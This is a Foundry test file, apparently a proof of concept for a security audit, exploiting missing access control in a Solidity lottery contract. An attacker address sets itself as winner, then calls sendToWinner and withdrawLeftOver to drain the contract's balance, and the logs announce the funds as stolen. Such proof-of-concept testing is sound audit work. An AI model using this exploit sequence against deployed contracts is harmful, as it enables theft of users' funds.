// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lotto.sol";

contract LottoTest is Test {
    Lotto public lotto;
    address deployer = address(0xA);
    address attacker = address(0xB);
    uint256 public constant INITIAL_BALANCE = 2 ether;

    // Events to check
    event LeftoverWithdrawn(address indexed withdrawer, uint256 amount);

    function setUp() public {
        vm.prank(deployer);
        lotto = new Lotto();
        vm.deal(address(lotto), INITIAL_BALANCE);
        vm.deal(attacker, 10 ether);
    }

    function test_public_set_winner() public {
        vm.prank(attacker);
        lotto.setWinner(attacker, 0.5 ether);

        // Verify winner was set by unauthorized address
        assertEq(lotto.winner(), attacker, "Attacker should be set as winner");
        assertEq(lotto.winAmount(), 0.5 ether, "Win amount should be set");
    }

    function test_unauthorized_withdrawal() public {
        // Set winner to attacker - setting winAmount to 0
        vm.prank(attacker);
        lotto.setWinner(attacker, 0);

        // Call sendToWinner to hopefully mark as paidOut
        vm.prank(attacker);
        lotto.sendToWinner();

        console2.log("--- BEFORE-Trigger Withdrawal ---");
        console2.log("Contract balance: %d", address(lotto).balance);
        console2.log("Attacker balance: %d", attacker.balance);
        console2.log("Winner address: %s", lotto.winner());
        console2.log("Win amount: %d", lotto.winAmount());

        console2.log("--- Trigger WithdrawLeftover ---");
        // Expect event emission when withdrawing
        vm.expectEmit(true, false, false, true);
        emit LeftoverWithdrawn(attacker, INITIAL_BALANCE);

        // Attempt withdrawal by unauthorized address
        vm.prank(attacker);
        lotto.withdrawLeftOver();

        console2.log("--- AFTER-Trigger Withdrawal ---");
        console2.log("Contract balance: %d", address(lotto).balance);
        console2.log("Attacker balance: %d", attacker.balance);
        console2.log("Winner address: %s", lotto.winner());
        console2.log("Win amount: %d", lotto.winAmount());

        // Differential verification
        bool fundsTransferred = (address(lotto).balance == 0) && 
                               (attacker.balance == 10 ether + INITIAL_BALANCE);
        
        if (fundsTransferred) {
            console2.log("State Changed: Funds successfully stolen");
            console2.log("Vulnerability confirmed: Unauthorized withdrawal");
            console2.log("Vulnerability Exists: Attacker successfully withdrew contract funds");
        } else {
            console2.log("State Unchanged: Funds not transferred");
            console2.log("Vulnerability not confirmed: Withdrawal failed");
            console2.log("Vulnerability not Exist: Access control prevents unauthorized withdrawal");
        }
    }
}